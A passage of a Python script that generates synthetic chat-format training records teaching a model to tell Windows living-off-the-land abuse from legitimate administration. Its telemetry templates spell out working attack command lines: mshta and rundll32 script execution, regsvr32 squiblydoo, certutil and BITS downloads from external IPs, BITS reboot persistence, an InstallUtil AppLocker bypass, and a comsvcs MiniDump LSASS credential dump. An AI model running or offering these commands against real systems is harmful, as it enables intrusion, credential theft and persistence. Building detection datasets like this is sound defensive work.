"""
stage_lotl_behavioral.py -- Living Off the Land (LotL / LOLBAS) Behavioral Dataset

Detection philosophy: behavioral evidence of LOLBin/LOLScript abuse -- NOT static
signatures or binary names. The model learns WHAT the binary is doing, not which
binary is doing it. A renamed certutil.exe still downloads files; a renamed mshta.exe
still executes JavaScript. The behavioral chain is the signal.

Key principle: every LOLBAS class has a LEGITIMATE admin use case that produces
similar-looking telemetry. The model must learn the DISCRIMINATING FACTORS that
separate malicious proxy execution from authorized administration. The admin FP
variants are as important as the TP variants.

Output:
  data/staging/lotl_behavioral_v1.jsonl
  data/staging/lotl_query_index.json

Usage:
    python stage_lotl_behavioral.py
    python stage_lotl_behavioral.py --records-per-class 15
    python stage_lotl_behavioral.py --tool-filter BinaryProxyMshta,CertutilLOLBin
"""

import json
import random
import argparse
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("stage-lotl")
random.seed(53)

OUTPUT_DIR  = Path("../data/staging")
OUTPUT_FILE = OUTPUT_DIR / "lotl_behavioral_v1.jsonl"
INDEX_FILE  = OUTPUT_DIR / "lotl_query_index.json"

SYS = {
    "sysmon_sensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 6D windows_math. Source: Sysmon event stream. "
        "Schema: sysmon_event_id, Image, CommandLine, ParentImage, User, IntegrityLevel, "
        "TargetImage, GrantedAccess, TargetObject, Details, ImageLoaded, Signed, "
        "SignatureStatus, PipeName, QueryName, TargetFilename, TamperingType, Hashes. "
        "Identify Living-off-the-Land (LOLBAS) tradecraft. Output MITRE ATT&CK + containment."
    ),
    "windows_deepsensor": (
        "You are the Host Forensics Expert. Target OS: Windows. "
        "Vector Space: 4D deepsensor_math. Source: DeepXDR EdrRow (UEBA). "
        "Schema: Image, CommandLine, destination_ip, pid, ppid, event_type, category, "
        "score, avg_entropy, max_velocity, tactic, technique, severity. "
        "Identify LOLBAS tradecraft. Output MITRE ATT&CK + containment."
    ),
}

VECTOR = {
    "sysmon_sensor":      "windows_math",
    "windows_deepsensor": "deepsensor_math",
}

TTP_CAT = "LOTL"

def _ip_int():  return f"10.{random.randint(0,10)}.{random.randint(1,254)}.{random.randint(1,254)}"
def _ip_ext():
    p = random.choice(["45.33","198.51","185.220","104.21","172.67","194.165","91.92"])
    return f"{p}.{random.randint(1,254)}.{random.randint(1,254)}"
def _host():    return f"{random.choice(['WS','SRV','DC','LT'])}-{random.randint(10,99)}"
def _user():    return random.choice(["jsmith","alee","tmorgan","schen","rbrown","lzhang"])
def _b64():     return "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",k=60))+"=="
def _pid():     return random.randint(1000, 65535)

def _cot(a1, a2, a3, conclusion, technique, action="contain"):
    return (f"<analysis>\n[AXIS 1] Benign Alternative Assessment:\n  {a1}\n"
            f"[AXIS 2] Behavioral Proof Assessment:\n  {a2}\n"
            f"[AXIS 3] Entity Coverage:\n  {a3}\n"
            f"[CONCLUSION] {conclusion}\n</analysis>\n"
            f"{'TRUE POSITIVE' if action == 'contain' else 'FALSE POSITIVE'}. {technique}\n"
            f"RECOMMENDED_ACTION: {action}")

def _record(tool_class, sensor, mitre, msgs, cls):
    import hashlib
    return {
        "ttp_category": TTP_CAT, "tool_class": tool_class,
        "mitre_techniques": mitre, "source_type": sensor,
        "vector_name": VECTOR[sensor], "classification": cls,
        "messages": msgs,
        "event_id": hashlib.md5(f"{tool_class}_{cls}_{sensor}".encode()).hexdigest()[:16],
    }

def _msg(sensor, user_text, asst_text):
    wrapped = (
        f"Spatial Anomaly Detected.\n"
        f"Source: {sensor}\n"
        f"Vector: <|spatial_vector|>\n"
        f"{user_text}"
    )
    return [{"role": "system",    "content": SYS[sensor]},
            {"role": "user",      "content": wrapped},
            {"role": "assistant", "content": asst_text}]


# ═══════════════════════════════════════════════════════════════════════════════
# 1. BinaryProxyMshta
#    Source: arcanaeum/offsec/ttps/6_LOTL/LOTL-example/POC.hta + initialize.hta
#            arcanaeum/offsec/ttps/6_LOTL/living-off-the-land/README.md (3-stage chain)
#            arcanaeum/offsec/ttps/6_LOTL/nebula/examples/mshta_calc.hta
#    Chain: mshta.exe executing HTA from URL/registry/file → JavaScript ActiveXObject
#           → WScript.Shell.Run() → cmd/powershell child → payload
#           OR: mshta javascript: URL inline → immediate execution
#    Evidence: EventID 1 (mshta.exe spawning cmd/powershell) +
#              EventID 3 (mshta.exe outbound HTTP) +
#              EventID 22 (mshta.exe DNS to fresh domain)
#    Admin FP: Legitimate HTA-based admin deployment tool (IT-signed, CMDB-registered)
# ═══════════════════════════════════════════════════════════════════════════════

def _mshta_tp(i):
    methods = [
        (f"mshta.exe http://{_ip_ext()}/payload.hta",
         "remote HTA download and execute"),
        (f"mshta.exe \"javascript:close(new ActiveXObject('WScript.Shell').Run('cmd /c {_b64()[:20]}',0))\"",
         "inline JavaScript execution hiding PowerShell window"),
        (f"mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"powershell -enc {_b64()[:40]}\"\",0)(window.close)\")",
         "VBScript inline payload execution"),
        (f"mshta.exe C:\\Users\\{_user()}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.hta",
         "local HTA from user-writable path"),
    ]
    cmdline, desc = methods[i % len(methods)]
    parent = random.choice(["WINWORD.EXE","EXCEL.EXE","outlook.exe","cmd.exe","explorer.exe"])
    child  = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    host = _host(); user = _user()
    attacker_ip = _ip_ext()

    prompt = (f"Windows Host Telemetry -- mshta.exe LOLBAS Proxy Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: mshta.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  EventID=3 (Network Connection) [if URL-based]\n"
              f"    Image: mshta.exe  DestinationIp={attacker_ip}  DestinationPort=80\n"
              f"  EventID=1 (Process Create -- child)\n"
              f"    Image: {child}  ParentImage: mshta.exe\n"
              f"    payload_delivered=YES  mshta_spawned_shell=YES")

    cot = _cot(
        "mshta.exe is occasionally used for legitimate HTML Application deployment "
        "in enterprise environments. However, legitimate HTA apps are stored in "
        "Program Files, are signed by IT, and never spawn cmd.exe or powershell.exe.",
        f"mshta.exe spawning {child} (shell interpreter) is not a legitimate HTA "
        f"application behavior. {desc}. Parent {parent} has no operational reason "
        "to invoke mshta.exe for execution. EventID 3 outbound connection from "
        "mshta.exe = downloading payload, not rendering a static HTA.",
        f"Host {host} ({user}): mshta.exe used as binary proxy to execute "
        f"arbitrary code via {child} child process. No disk artifact required.",
        f"mshta.exe LOLBAS proxy execution confirmed -- spawning {child} from {parent}.",
        "MITRE T1218.005 (System Binary Proxy Execution: Mshta). "
        f"Kill mshta.exe and {child}, isolate host, trace parent {parent} for initial access.",
    )
    return prompt, cot, "true_positive"

def _mshta_fp(i):
    tool_name = random.choice(["NexusDeploy.hta","ITAdmin.hta","UpdateManager.hta"])
    prompt = (f"Windows Host Telemetry -- Legitimate HTA Administrative Tool.\n"
              f"  EventID=1  Image: mshta.exe  ParentImage: explorer.exe\n"
              f"    CommandLine: mshta.exe C:\\Program Files\\ITTools\\{tool_name}\n"
              f"    code_signed=YES  vendor=corp-pki-ca\n"
              f"  no_child_shell_process=YES  no_network_connection=YES\n"
              f"  cmdb_registered=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        f"IT-deployed signed HTA tool from Program Files -- no shell child, no network, "
        "corporate PKI signature, CMDB-registered.",
        "CommandLine points to Program Files (not temp). Signed by corp PKI. "
        "No cmd.exe/powershell.exe child. No outbound connection. CMDB-registered.",
        "Authorized IT HTA tool -- signed, Program Files path, no shell spawn.",
        f"IT HTA tool {tool_name} -- signed, no child shell, no network.",
        "T1218.005 -- AUTHORIZED HTA TOOL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 2. BinaryProxyRegsvr32
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/regsvr32_squiblydoo.sct
#            NEBULA framework Squiblydoo technique
#    Chain: regsvr32 /s /n /u /i:http://<url> scrobj.dll → downloads .sct scriptlet
#           → JScript/VBScript executes in scrobj context → WScript.Shell.Run()
#           Note: /u (uninstall) flag = no registry write, makes detection harder
#    Evidence: EventID 1 (regsvr32 with /i:http URL or unusual .sct) +
#              EventID 3 (regsvr32 outbound HTTP) +
#              EventID 1 (child process from regsvr32)
#    Admin FP: Legitimate COM server DLL registration during software install
# ═══════════════════════════════════════════════════════════════════════════════

def _reg32_tp(i):
    targets = [
        (f"regsvr32.exe /s /n /u /i:http://{_ip_ext()}/payload.sct scrobj.dll",
         "remote SCT file via URL (squiblydoo)"),
        (f"regsvr32.exe /s /n /u /i:http://{_ip_ext()}/c/file.txt scrobj.dll",
         "disguised as .txt but SCT content (extension ignored by scrobj)"),
        (f"regsvr32.exe /s /u /i:%TEMP%\\{''.join(random.choices('abcdef',k=6))}.sct scrobj.dll",
         "local SCT file in TEMP -- no network needed"),
        (f"regsvr32 /s /n /u /i:file://{_ip_int()}/share/payload.sct scrobj.dll",
         "UNC path SCT -- triggers NTLM auth as bonus"),
    ]
    cmdline, desc = targets[i % len(targets)]
    host = _host(); user = _user()
    child = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    attacker_url = cmdline.split("/i:")[1].split(" ")[0] if "/i:" in cmdline else "local"

    prompt = (f"Windows Host Telemetry -- regsvr32.exe Squiblydoo LOLBAS Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: regsvr32.exe\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"    no_registry_write=YES  (/u flag suppresses DllRegisterServer call)\n"
              f"  EventID=3 (Network Connection) [URL-based only]\n"
              f"    Image: regsvr32.exe  DestinationIp={_ip_ext()}  DestinationPort=80\n"
              f"  EventID=1 (child from regsvr32.exe)\n"
              f"    Image: {child}  ParentImage: regsvr32.exe")

    cot = _cot(
        "regsvr32.exe registers COM server DLLs during software installation. "
        "Legitimate use: `regsvr32.exe C:\\Program Files\\Vendor\\comserver.dll` -- "
        "no /n, no /u, no /i:URL, no network connection, no child shell.",
        f"/s /n /u /i:<url> flags = squiblydoo technique (download-and-execute). "
        f"/u (uninstall) calls DllUnregisterServer, not DllRegisterServer -- avoids "
        "registry write that would show in EventID 13. scrobj.dll is the actual "
        f"registered DLL; the SCT content from {attacker_url} is JScript/VBScript "
        f"that creates ActiveXObject WScript.Shell → spawns {child}.",
        f"Host {host} ({user}): regsvr32.exe used as AppLocker/AppControl bypass "
        "to execute arbitrary code without writing to disk.",
        "regsvr32.exe squiblydoo confirmed -- /i:URL + scrobj.dll + shell child.",
        "MITRE T1218.010 (System Binary Proxy Execution: Regsvr32). "
        "Block regsvr32 outbound connections, kill child processes, isolate host.",
    )
    return prompt, cot, "true_positive"

def _reg32_fp(i):
    vendor = random.choice(["Adobe","Symantec","SAP","Oracle"])
    dll    = random.choice(["pdfcreator.dll","snac.dll","sapbex.dll","ojpse12.dll"])
    prompt = (f"Windows Host Telemetry -- Authorized COM DLL Registration.\n"
              f"  EventID=1  Image: regsvr32.exe\n"
              f"    CommandLine: regsvr32.exe /s C:\\Program Files\\{vendor}\\{dll}\n"
              f"    no_URL_flag=YES  no_scrobj_dll=YES\n"
              f"  EventID=13 (Registry Set)\n"
              f"    DllRegisterServer_called=YES  HKCR_CLSID_entry_created=YES\n"
              f"  code_signed=YES  vendor={vendor}  installer_parent=MsiExec.exe")
    cot = _cot(
        f"Software installation registering a signed {vendor} COM DLL -- "
        "standard MsiExec parent, signed binary, HKCR CLSID entry created.",
        "No /n, no /u, no /i:URL, no scrobj.dll. MsiExec parent. "
        "Signed by vendor. HKCR CLSID entry created = legitimate DllRegisterServer call.",
        f"Authorized COM DLL registration by {vendor} installer.",
        f"Software installer registering {dll} -- signed, MsiExec parent, no URL.",
        "T1218.010 -- AUTHORIZED DLL REGISTRATION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 3. BinaryProxyRundll32
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/rundll32_javascript.txt
#            arcanaeum/offsec/ttps/6_LOTL/nebula/examples/rundll32_calc.sct
#    Chain: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication " → inline JS
#           OR: GetObject("script:URL") → downloads SCT/JScript from URL
#           OR: PCWDiagnostic CLSID / comsvcs.dll MiniDump (credential dumping path)
#    Evidence: EventID 1 (rundll32 with javascript: protocol or script: GetObject) +
#              EventID 3 (rundll32 outbound HTTP for GetObject) +
#              EventID 1 (child from rundll32)
#    Admin FP: Legitimate Windows system functions via rundll32 (shell32, user32, etc.)
# ═══════════════════════════════════════════════════════════════════════════════

def _rd32_tp(i):
    ext_ip = _ip_ext()
    variants = [
        (f"rundll32.exe javascript:\"\\.\\.\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://{ext_ip}/payload.sct\")",
         "GetObject script: URL to download+exec SCT"),
        (f"rundll32.exe javascript:\"\\.\\.\\mshtml,RunHTMLApplication \";alert('LOTL');",
         "inline JavaScript alert (PoC; replace with payload)"),
        ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump lsass.exe %TEMP%\\lsass.dmp full",
         "comsvcs MiniDump credential dump -- LSASS memory"),
        (f"rundll32.exe vbscript:\"CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell -enc {_b64()[:30]}\\\",0)(close)\"",
         "VBScript protocol inline execution"),
    ]
    cmdline, desc = variants[i % len(variants)]
    child = "cmd.exe" if "javascript" in cmdline else "powershell.exe"
    host = _host(); user = _user()

    prompt = (f"Windows Host Telemetry -- rundll32.exe LOLBAS Proxy Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: rundll32.exe\n"
              f"    CommandLine: {cmdline[:120]}...\n"
              f"    ({desc})\n"
              + (f"  EventID=3 (Network Connection)\n"
                 f"    Image: rundll32.exe  DestinationIp={ext_ip}  DestinationPort=80\n"
                 if "http://" in cmdline else "")
              + f"  EventID=1 (child)\n"
              f"    Image: {child}  ParentImage: rundll32.exe\n"
              f"    (or: lsass.dmp written to %TEMP% for comsvcs variant)")

    lsass_note = (" comsvcs.dll MiniDump path = LSASS credential dump -- "
                  "SYSTEM token required, UAC bypass typically precedes this." if "comsvcs" in cmdline else "")

    cot = _cot(
        "Legitimate rundll32.exe calls are for well-known Windows DLL functions: "
        "shell32.dll SHFormatDrive, user32.dll LockWorkStation, etc. "
        "None of them use the javascript: or vbscript: protocol. "
        "comsvcs.dll MiniDump is a Windows function but never called from user context.",
        f"javascript: or vbscript: protocol in rundll32 CommandLine = "
        "using mshtml to execute scripting engine (not a registered DLL export). "
        f"{desc}.{lsass_note} "
        f"{'GetObject script: URL downloads attacker-controlled JScript from network.' if 'GetObject' in cmdline else ''}",
        f"Host {host} ({user}): rundll32.exe used as script proxy to execute "
        "arbitrary code. No DLL file needed on disk.",
        f"rundll32.exe LOLBAS proxy confirmed -- {desc}.",
        "MITRE T1218.011 (System Binary Proxy Execution: Rundll32). "
        + ("T1003.001 (LSASS Credential Dump). " if "comsvcs" in cmdline else "")
        + "Kill rundll32.exe and child processes, isolate host.",
    )
    return prompt, cot, "true_positive"

def _rd32_fp(i):
    func = random.choice(["shell32.dll,SHFormatDrive","user32.dll,LockWorkStation","zipfldr.dll,RouteTheCall"])
    prompt = (f"Windows Host Telemetry -- Authorized rundll32.exe System Call.\n"
              f"  EventID=1  Image: rundll32.exe\n"
              f"    CommandLine: rundll32.exe {func}\n"
              f"    no_javascript_protocol=YES  no_network=YES\n"
              f"    known_windows_function=YES  no_child_shell=YES")
    cot = _cot(
        f"rundll32.exe calling {func} -- standard Windows system function invocation.",
        "No javascript:/vbscript: protocol. No network connection. "
        "Known Windows DLL+export. No shell child process.",
        f"Authorized Windows function call via rundll32 -- {func}.",
        f"rundll32 calling {func} -- legitimate system function, no script proxy.",
        "T1218.011 -- AUTHORIZED SYSTEM FUNCTION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 4. CertutilLOLBin
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/certutil_download.txt
#    Chain: certutil -urlcache -split -f <URL> <localfile> → download payload
#           OR: certutil -decode <b64file> <output> → decode base64-encoded payload
#           Chained: download encoded file → decode → execute
#    Evidence: EventID 3 (certutil outbound HTTP) +
#              EventID 11 (file created by certutil from network) +
#              EventID 1 (subsequent execution of downloaded file)
#    Admin FP: certutil managing certificates (verifying chains, exporting certs)
# ═══════════════════════════════════════════════════════════════════════════════

def _certutil_tp(i):
    ext_ip   = _ip_ext()
    domain   = f"{random.choice(['update','cdn','static'])}-{random.randint(100,999)}.{random.choice(['net','com','io'])}"
    payload  = f"{''.join(random.choices('abcdefghijklmnop',k=8))}.{random.choice(['exe','dll','bat','ps1'])}"
    b64file  = f"{''.join(random.choices('abcdefghijklmnop',k=6))}.txt"
    host = _host(); user = _user()
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe","WINWORD.EXE"])

    chains = [
        (f"certutil -urlcache -split -f http://{domain}/{payload} %TEMP%\\{payload}",
         f"direct file download to %TEMP%"),
        (f"certutil -verifyctl -split -f http://{domain}/{b64file} %TEMP%\\{b64file}",
         "verifyctl download disguise"),
        (f"certutil -urlcache -f http://{domain}/{b64file} %TEMP%\\{b64file} && "
         f"certutil -decode %TEMP%\\{b64file} %TEMP%\\{payload}",
         "download + base64 decode chain"),
    ]
    cmdline, desc = chains[i % len(chains)]

    prompt = (f"Windows Host Telemetry -- certutil.exe LOLBAS File Transfer.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: certutil.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  EventID=3 (Network Connection)\n"
              f"    Image: certutil.exe  DestinationIp={ext_ip}  DestinationPort=80\n"
              f"    domain={domain}  domain_age_days={random.randint(1,30)}\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: certutil.exe  TargetFilename: %TEMP%\\{payload}\n"
              f"  EventID=1 (subsequent exec)\n"
              f"    Image: %TEMP%\\{payload}  ParentImage: {parent}")

    cot = _cot(
        "certutil.exe manages Windows certificate stores -- verifying chains, "
        "importing/exporting certificates, encoding/decoding files. Legitimate certutil "
        "operations target .cer/.pfx/.p7b files in certificate directories, "
        "not .exe/.dll in %TEMP% from the internet.",
        f"certutil.exe making HTTP connection to {domain} (domain age {random.randint(1,30)}d) "
        f"= {desc}. Writing executable to %TEMP% = payload staging. "
        "certutil has no legitimate reason to download .exe/.dll files from the internet. "
        "Immediate execution of the downloaded file = dropper chain confirmed.",
        f"Host {host} ({user}): certutil.exe used as LOLBin downloader. "
        f"Payload {payload} downloaded from {domain} and executed.",
        f"certutil.exe LOLBAS downloader confirmed -- {desc}.",
        "MITRE T1105 (Ingress Tool Transfer) + T1140 (Deobfuscate/Decode Files). "
        f"Remove downloaded file from %TEMP%, kill execution chain, block {domain}.",
    )
    return prompt, cot, "true_positive"

def _certutil_fp(i):
    prompt = (f"Windows Host Telemetry -- certutil.exe Certificate Verification.\n"
              f"  EventID=1  Image: certutil.exe  ParentImage: cmd.exe\n"
              f"    CommandLine: certutil -verify C:\\certs\\corp-issuing-ca.crt\n"
              f"    no_urlcache=YES  no_outbound_http=YES  target_extension=.crt\n"
              f"    it_admin_context=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "IT admin verifying internal CA certificate chain with certutil. "
        "No -urlcache, no -decode, no network, no temp executable.",
        "No -urlcache or -f flags. No outbound HTTP. Target is .crt (certificate file). "
        "IT admin context. Change ticket. No file written to TEMP.",
        "Authorized certificate chain verification -- no download, no decode.",
        "certutil -verify on .crt file -- legitimate cert management, no download.",
        "T1105 -- AUTHORIZED CERTIFICATE MANAGEMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 5. BITSJobAbuse
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/bitsadmin_transfer.txt
#    Chain: bitsadmin /transfer /Download /priority Foreground <URL> <local>
#           → BITS service downloads file in background → execute
#           ADVANCED: bitsadmin /addexecjob for persistence
#           (BITS jobs survive reboots -- built-in persistence)
#    Evidence: EventID 1 (bitsadmin with /transfer) +
#              EventID 1 (Start-BitsTransfer in PS) +
#              EventID 3 (svchost -k netsvcs making connection for BITS)
#    Admin FP: Windows Update uses BITS legitimately
# ═══════════════════════════════════════════════════════════════════════════════

def _bits_tp(i):
    ext_url  = f"http://{_ip_ext()}/{random.choice(['update','patch','tool'])}.exe"
    dest     = f"%TEMP%\\{''.join(random.choices('abcdef',k=6))}.exe"
    host = _host(); user = _user()
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe"])

    variants = [
        (f"bitsadmin.exe /transfer Download /priority Foreground {ext_url} {dest}",
         "bitsadmin foreground transfer", False),
        (f"Start-BitsTransfer -Priority foreground -Source {ext_url} -Destination {dest}",
         "PowerShell Start-BitsTransfer", False),
        (f"bitsadmin /create NexusUpdate && bitsadmin /addfile NexusUpdate {ext_url} {dest} && "
         f"bitsadmin /SetNotifyCmdLine NexusUpdate {dest} NULL && bitsadmin /Resume NexusUpdate",
         "BITS job with NotifyCmdLine persistence (survives reboot)", True),
    ]
    cmdline, desc, persistent = variants[i % len(variants)]

    prompt = (f"Windows Host Telemetry -- BITS Job LOLBAS Abuse.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: {'bitsadmin.exe' if 'bitsadmin' in cmdline else 'powershell.exe'}  "
              f"ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  EventID=3 (Network Connection)\n"
              f"    Image: svchost.exe -k netsvcs  (BITS service)\n"
              f"    DestinationIp={ext_url.split('/')[2]}  DestinationPort=80\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: svchost.exe  TargetFilename: {dest}\n"
              + (f"  BITS_job_persists_across_reboot=YES  (NotifyCmdLine executes payload on next boot)\n"
                 if persistent else ""))

    persist_note = " BITS job with SetNotifyCmdLine survives reboot -- built-in persistence." if persistent else ""

    cot = _cot(
        "Windows Update and deployment tools use BITS for background file transfers. "
        "BITS jobs from authenticated service accounts to Microsoft CDN URLs are expected. "
        "User-created BITS jobs downloading from non-Microsoft IPs are not.",
        f"bitsadmin/Start-BitsTransfer used by {user} (interactive user, not SYSTEM service) "
        f"to download from {ext_url.split('/')[2]} (non-Microsoft IP) to %TEMP% = "
        "LOLBAS download confirmed. No Windows Update signature on downloaded file. "
        f"{persist_note}",
        f"Host {host} ({user}): BITS job created to download payload from external IP. "
        + ("BITS persistence installed -- payload executes on every reboot." if persistent else ""),
        f"BITS job LOLBAS abuse confirmed -- {desc}.",
        "MITRE T1197 (BITS Job) + T1105. "
        f"Cancel all BITS jobs (bitsadmin /reset), delete {dest}, block IP.",
    )
    return prompt, cot, "true_positive"

def _bits_fp(i):
    prompt = (f"Windows Host Telemetry -- Windows Update BITS Transfer.\n"
              f"  EventID=3  Image: svchost.exe -k netsvcs  (BITS service)\n"
              f"    DestinationIp=23.220.33.0/24  (Microsoft CDN)\n"
              f"    triggered_by=wuauserv  (Windows Update service)\n"
              f"  downloaded_file_signed=YES  vendor=Microsoft Corporation\n"
              f"  no_user_created_job=YES  no_notifycmdline=YES")
    cot = _cot(
        "Windows Update BITS transfer to Microsoft CDN from SYSTEM account wuauserv. "
        "Signed Microsoft payload. No user-created job. No NotifyCmdLine.",
        "SYSTEM account (wuauserv). Microsoft CDN IP. Signed download. "
        "No user-created job. No NotifyCmdLine persistence.",
        "Authorized Windows Update BITS transfer -- Microsoft, SYSTEM, signed.",
        "Windows Update BITS -- SYSTEM account, Microsoft CDN, signed payload.",
        "T1197 -- AUTHORIZED WINDOWS UPDATE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 6. InstallUtilBypass
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/installutil_bypass.txt
#                                                       installutil_bypass.cs
#    Chain: compile C# DLL with [RunInstaller(true)] class →
#           InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll →
#           Uninstall() method executes arbitrary code in .NET CLR →
#           AppLocker / application control bypass (InstallUtil is trusted)
#    Evidence: EventID 1 (InstallUtil with /U flag + temp path DLL) +
#              EventID 7 (DLL loaded from temp by InstallUtil) +
#              EventID 1 (child from InstallUtil)
#    Admin FP: Legitimate software uninstallation via InstallUtil
# ═══════════════════════════════════════════════════════════════════════════════

def _iu_tp(i):
    fw    = random.choice(["v4.0.30319","v2.0.50727"])
    arch  = random.choice(["","64"])
    dll   = f"C:\\Users\\{_user()}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.dll"
    host = _host(); user = _user()
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe","WINWORD.EXE"])

    cmdline = (f"C:\\Windows\\Microsoft.NET\\Framework{arch}\\{fw}\\InstallUtil.exe "
               f"/logfile= /LogToConsole=false /U {dll}")

    prompt = (f"Windows Host Telemetry -- InstallUtil.exe LOLBAS AppLocker Bypass.\n"
              f"Host: {host}  User: {user}\n"
              f"  phase_1_compile: EventID=1\n"
              f"    Image: {'csc.exe' if i%2==0 else 'msbuild.exe'}  "
              f"ParentImage: {parent}\n"
              f"    CommandLine: csc.exe /target:library /out:{dll} payload.cs\n"
              f"    (compiling C# DLL with [RunInstaller(true)] Uninstall() method)\n"
              f"  phase_2_execute: EventID=1\n"
              f"    Image: InstallUtil.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    /U_flag=YES  (triggers Uninstall method, not DllInstall)\n"
              f"    dll_from_temp=YES  dll_unsigned=YES\n"
              f"  EventID=7 (ImageLoaded)\n"
              f"    Image: InstallUtil.exe  ImageLoaded: {dll}  Signed: false\n"
              f"  EventID=1 (child from InstallUtil.exe)\n"
              f"    Image: cmd.exe  ParentImage: InstallUtil.exe")

    cot = _cot(
        "InstallUtil.exe is used during software installation and uninstallation "
        "to run installer components. Legitimate use: signed DLL from Program Files, "
        "spawned by MsiExec.exe or installer, with a log file path set.",
        f"/U flag with /logfile= (empty log) and /LogToConsole=false = "
        "attacker suppressing all output to hide execution. DLL from %TEMP% "
        "compiled by {parent} just before = on-the-fly payload compilation. "
        "Unsigned DLL (EventID 7 Signed=false) loaded by InstallUtil = "
        "AppLocker bypass confirmed (InstallUtil is on the trusted binaries list).",
        f"Host {host} ({user}): InstallUtil.exe used to bypass application "
        "whitelisting. Unsigned DLL executed via Uninstall() method in .NET CLR.",
        "InstallUtil AppLocker bypass confirmed -- /U + temp DLL + no log + shell child.",
        "MITRE T1218.004 (System Binary Proxy Execution: InstallUtil). "
        "Delete temp DLL, kill child processes, review AppLocker policy.",
    )
    return prompt, cot, "true_positive"

def _iu_fp(i):
    vendor = random.choice(["SAP","Oracle","Adobe"])
    prompt = (f"Windows Host Telemetry -- Authorized InstallUtil Software Install.\n"
              f"  EventID=1  Image: InstallUtil.exe  ParentImage: MsiExec.exe\n"
              f"    CommandLine: InstallUtil.exe C:\\Program Files\\{vendor}\\setup.dll\n"
              f"    /U_flag=NO  logfile_set=YES\n"
              f"  EventID=7  Signed=true  SignatureIssuer={vendor}\n"
              f"  no_temp_dll=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        f"MsiExec installing {vendor} software using InstallUtil -- "
        "signed DLL from Program Files, MsiExec parent, log file set.",
        "MsiExec parent. DLL from Program Files. Signed by vendor. Log file set. "
        "No /U flag suppression. Change ticket.",
        f"Authorized {vendor} software installation via InstallUtil.",
        f"MsiExec → InstallUtil → signed {vendor} DLL -- authorized install.",
        "T1218.004 -- AUTHORIZED SOFTWARE INSTALL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 7. MSBuildInlineTask
#    Source: arcanaeum/offsec/ttps/6_LOTL/nebula/examples/msbuild_inline_task.csproj
#    Chain: MSBuild.exe <payload>.csproj → parses UsingTask with CodeTaskFactory →
#           compiles and executes inline C# code in .NET CLR →
#           arbitrary code execution as trusted MSBuild process
#    MITRE: T1127.001 (Trusted Developer Utilities Proxy Execution: MSBuild)
#    Evidence: EventID 1 (MSBuild with .csproj from non-dev location) +
#              EventID 7 (Microsoft.Build.Tasks DLL loaded) +
#              EventID 1 (child from MSBuild)
#    Admin FP: MSBuild in Visual Studio / CI/CD pipeline builds
# ═══════════════════════════════════════════════════════════════════════════════

def _msbuild_tp(i):
    fw     = random.choice(["v4.0.30319","v3.5"])
    proj   = random.choice([
        f"C:\\Users\\{_user()}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.csproj",
        f"C:\\Users\\{_user()}\\Downloads\\build.proj",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}.targets",
    ])
    host = _host(); user = _user()
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe","WINWORD.EXE"])

    prompt = (f"Windows Host Telemetry -- MSBuild.exe Inline Task LOLBAS Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
